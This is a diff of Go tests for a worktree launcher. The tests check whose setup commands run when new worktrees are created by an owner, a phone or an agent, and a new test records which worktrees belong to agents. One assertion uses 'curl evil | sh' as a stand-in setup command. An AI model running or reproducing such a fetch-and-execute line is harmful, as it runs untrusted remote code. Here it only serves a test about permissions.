@@ -349,7 +349,7 @@ func TestANewWorktreeRunsTheRepoSetupUnlessTheProjectSettingsNameOne(t *testing.
 	} {
 		f := registry.File{Repos: map[string]registry.Repo{"/p": {Setup: c.settings}}}
 		s := proto.LaunchSpec{Project: "/p", Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w", Setup: c.setup, Copy: &off}}}
-		if _, got, _ := filled(Who{Owner: true}, f, s, tree, quiet); got != c.want {
+		if _, got, _ := (&Launcher{}).filled(Who{Owner: true}, f, s, tree, quiet); got != c.want {
 			t.Errorf("%s: setup %q, want %q", c.name, got, c.want)
 		}
 	}
@@ -365,14 +365,14 @@ func TestAPhonesNewWorktreeRunsOnlyTheSetupInTheProjectsOwnCheckout(t *testing.T
 	s := proto.LaunchSpec{Project: project, Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w"}}}
 	quiet := func(string, string) {}
 	phone := Who{Key: "device:d1"}
-	if _, got, _ := filled(phone, f, s, tree, quiet); got != "" {
+	if _, got, _ := (&Launcher{}).filled(phone, f, s, tree, quiet); got != "" {
 		t.Errorf("a branch's own setup ran for a phone: %q", got)
 	}
 	os.WriteFile(filepath.Join(project, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
-	if _, got, _ := filled(phone, f, s, tree, quiet); got != "make deps" {
+	if _, got, _ := (&Launcher{}).filled(phone, f, s, tree, quiet); got != "make deps" {
 		t.Errorf("setup %q, want the checkout's", got)
 	}
-	if _, got, _ := filled(Who{Owner: true}, f, s, tree, quiet); got != "curl evil | sh" {
+	if _, got, _ := (&Launcher{}).filled(Who{Owner: true}, f, s, tree, quiet); got != "curl evil | sh" {
 		t.Errorf("the owner's setup %q, want the tree's", got)
 	}
 }
@@ -513,5 +513,25 @@ func TestTwoCreatesHoldingTheSamePlaceholderGetNamesOfTheirOwnUntilOneIsMade(t *
 	third := &proto.NewWorktree{Name: "notes"}
 	if _, err := l.hold(f, project, third); err != nil || third.Name != "notes" {
 		t.Fatalf("after the first let go: %q, %v", third.Name, err)
+	}
+}
+
+func TestANewWorktreeTheOwnerMakesForAnAgentIsRecordedAsTheAgents(t *testing.T) {
+	reg := registry.Open(t.TempDir())
+	l := &Launcher{reg: reg}
+	off := false
+	quiet := func(string, string) {}
+	spec := func(forAgent bool) proto.LaunchSpec {
+		return proto.LaunchSpec{Project: "/p", Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w", Setup: &off, Copy: &off, ForAgent: forAgent}}}
+	}
+	l.filled(Who{Owner: true}, registry.File{}, spec(false), "/wt/person", quiet)
+	l.filled(Who{Key: "device:d"}, registry.File{}, spec(true), "/wt/phone", quiet)
+	l.filled(Who{Owner: true}, registry.File{}, spec(true), "/wt/agent", quiet)
+	if got := reg.Load().AgentWorktrees; !slices.Equal(got, []string{"/wt/agent"}) {
+		t.Fatalf("agent worktrees %v", got)
+	}
+	l.filled(Who{Owner: true}, reg.Load(), spec(false), "/wt/agent", quiet)
+	if got := reg.Load().AgentWorktrees; len(got) != 0 {
+		t.Fatalf("a person's new worktree where an agent's was is still the agent's: %v", got)
 	}
 }
